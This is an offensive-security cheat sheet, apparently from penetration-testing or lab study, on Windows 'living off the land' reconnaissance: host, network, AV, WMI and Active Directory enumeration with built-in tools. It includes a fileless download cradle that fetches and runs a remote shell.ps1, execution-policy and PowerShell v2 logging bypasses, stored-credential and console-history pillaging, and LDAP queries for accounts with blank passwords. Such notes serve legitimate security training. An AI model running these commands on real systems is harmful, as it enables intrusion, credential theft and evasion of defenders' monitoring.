# Living Off the Land (Windows Situational Awareness)
**Concept:** Using trusted, pre-installed system tools (PowerShell, WMI, Net.exe) to conduct reconnaissance and execute attacks. **Goal:** Map the Host, Network, and Domain without touching disk or triggering AV.
## 1. Basic Host Enumeration (CMD)
**Context:** These are your "who am I and where am I" commands. Run these immediately upon getting a shell to orient yourself.

| **Command**        | **Result**            | **Intelligence Gained**                                                   |
| -------------- | ----------------- | --------------------------------------------------------------------- |
| `hostname`     | Host Name         | Target identification.                                                |
| `whoami /all`  | User & Privileges | Check current user and groups (Look for `SeImpersonatePrivilege`).    |
| `systeminfo`   | OS & Hotfixes     | OS Version (e.g., Server 2019) and Patch level (for Kernel exploits). |
| `set`          | Env Variables     | `LOGONSERVER` (DC Name), `USERDOMAIN`.                                |
| `wmic qfe`     | Patches           | Specific hotfixes (Quick Fix Engineering).                            |
| `cmdkey /list` | Stored Creds      | **High Value.** Lists saved credentials for RDP/Shares.               |
## 2. Harnessing PowerShell
**Context:** PowerShell is the most powerful LotL tool, but also the most monitored (Script Block Logging, AMSI). **OPSEC:** Always check the Execution Policy first.

|**Cmdlet**|**Description**|
|---|---|
|`Get-ExecutionPolicy -List`|Checks if you can run scripts. If Restricted, you need a bypass.|
|`Set-ExecutionPolicy Bypass -Scope Process`|**The Bypass.** Unlocks script execution only for the _current_ session (RAM only).|
|`Get-Module`|Lists loaded modules (e.g., is an AV module loaded?).|
|`Get-ChildItem Env:`|Dumps environment variables (look for API keys or paths).|
|`powershell -version 2`|**Downgrade Attack.** Attempts to run PSv2 to bypass modern logging (ScriptBlock).|
### The Download Cradle (Fileless Execution)
Download and execute a script directly from memory without saving to disk.
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.18/shell.ps1')"
```
### History Mining (Pillaging)
Developers often type passwords into the console.
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## 3. Checking Defenses (AV & Firewall)
**Goal:** Identify what is watching you before you make noise.

| **Command**                              | **Description**                                                               |
| ------------------------------------ | ------------------------------------------------------------------------- |
| `netsh advfirewall show allprofiles` | Status of Windows Firewall (On/Off).                                      |
| `sc query windefend`                 | Check if Windows Defender service is running.                             |
| `Get-MpComputerStatus`               | **Detailed Defender Status.** Shows RealTimeProtection, last update, etc. |
| `qwinsta`                            | List RDP sessions (See if admins are currently logged in).                |
## 4. Network Reconnaissance
**Goal:** Map the internal network interfaces and neighbors.

| **Command**         | **Description**                                                                          |
| --------------- | ------------------------------------------------------------------------------------ |
| `ipconfig /all` | Interfaces, DNS Servers, and Domain Name.                                            |
| `arp -a`        | **Neighbors.** Lists hosts the machine has recently talked to (useful for pivoting). |
| `route print`   | **Routing Table.** Reveals other subnets (Internal networks, Docker networks, VPNs). |
| `netstat -ano`  | **Listening Ports.** Identify internal services (SQL, RDP, WinRM).                   |
## 5. Windows Management Instrumentation (WMI)
**Concept:** WMI is an interface to query the OS deep internals. It is often less logged than standard commands.

| **Command**                         | **Intelligence Gained**                                 |
| ------------------------------- | --------------------------------------------------- |
| `wmic process list full`        | Running processes (Antivirus, Agents, Admin tools). |
| `wmic product get name,version` | Installed Software (Vulnerable apps?).              |
| `wmic useraccount list full`    | Local users and Domain users who have logged in.    |
| `wmic ntdomain list`            | Domain Controllers and Domain status.               |
| `wmic service list brief`       | Running services.                                   |
## 6. Domain Reconnaissance (Net.exe)
**Context:** "The Old Ways." These commands query the Domain Controller. 
**Warning:** These generate traffic to the DC and can be detected if run aggressively.

| **Command**                                  | **Description**                                           |
| ---------------------------------------- | ----------------------------------------------------- |
| `net user /domain`                       | List all users in the domain.                         |
| `net user <User> /domain`                | Details on a specific user (Groups, Password Policy). |
| `net group "Domain Admins" /domain`      | **The Target.** List the Domain Admins.               |
| `net group "Domain Controllers" /domain` | List the DCs (IPs to target).                         |
| `net share`                              | List local SMB shares.                                |
| `net view /domain`                       | List all computers in the domain (noisy).             |
## 7. Advanced LDAP Querying (Dsquery)
**Context:** `Dsquery` is a native tool on Windows Server (and RSAT installed hosts). It allows precise LDAP filtering.
### Basic Searches
```powershell
# Find Users
dsquery user

# Find Computers
dsquery computer

# Find Domain Controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
### Hunting Vulnerable Accounts
**PASSWD_NOTREQD:** Find users who might have blank passwords.
```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```